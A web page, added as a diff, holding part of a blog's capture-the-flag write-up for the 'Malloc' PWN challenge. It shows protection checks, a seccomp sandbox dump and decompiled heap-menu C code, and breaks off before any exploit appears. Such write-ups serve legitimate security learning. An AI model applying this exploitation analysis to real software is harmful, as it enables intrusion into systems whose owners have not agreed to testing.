@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Findkey">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://find-key.github.io/2025/10/13/ycb-pwn-some-wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="羊城杯-PWN-部分WP">
+<meta property="og:url" content="https://find-key.github.io/2025/10/13/YCB-PWN-some-WP/index.html">
+<meta property="og:site_name" content="Find-key&#39;Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://find-key.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-10-13T05:15:08.000Z">
+<meta property="article:modified_time" content="2026-04-02T15:09:23.926Z">
+<meta property="article:author" content="Find-key">
+<meta property="article:tag" content="Write Up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://find-key.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            羊城杯-PWN-部分WP | Findkey&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"find-key.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"To Be PWN Master.","subtitle":{"text":[],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Find-key"},{"icon":"fa-solid fa-at","url":"Find_key@foxmail.com"},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Friends":{"path":"/links/","icon":"fa-solid fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"为之则易，不为则难","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Findkey&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">羊城杯-PWN-部分WP</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/head_image.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Findkey</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-13 13:15:08</span>
+        <span class="mobile">2025-10-13 13:15:08</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-02 23:09:23</span>
+            <span class="mobile">2026-04-02 23:09:23</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Write-Up/">Write Up</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>checksec, 发现是全保护.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nothing; <span class="comment">// [rsp+3h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> c; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  initstream();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======MALLOC_MENU======&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1:creat&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2:delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3:edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4:show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5:exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%c&quot;</span>, &amp;c, &amp;nothing);</span><br><span class="line">    <span class="keyword">switch</span> ( c )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-21h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+14h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%u%c&quot;</span>, &amp;idx, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0x10</span> &amp;&amp; (<span class="built_in">puts</span>(<span class="string">&quot;size&quot;</span>), <span class="built_in">scanf</span>(<span class="string">&quot;%u%c&quot;</span>, &amp;size, &amp;v1), size &lt;= <span class="number">0x70</span>) &amp;&amp; size &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = idx;</span><br><span class="line">    chunk.arr_list[v0] = alloc(size);</span><br><span class="line">    chunk.size_list[idx] = size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chunk_head **__fastcall <span class="title function_">alloc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> real_size; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> low; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> line; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  chunk_head *v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  chunk_head *ptr; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  low = size &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( low &gt; <span class="number">8</span> )</span><br><span class="line">    real_size = size - low + <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    real_size = size - low + <span class="number">16</span>;                <span class="comment">// fix size</span></span><br><span class="line">  line = real_size 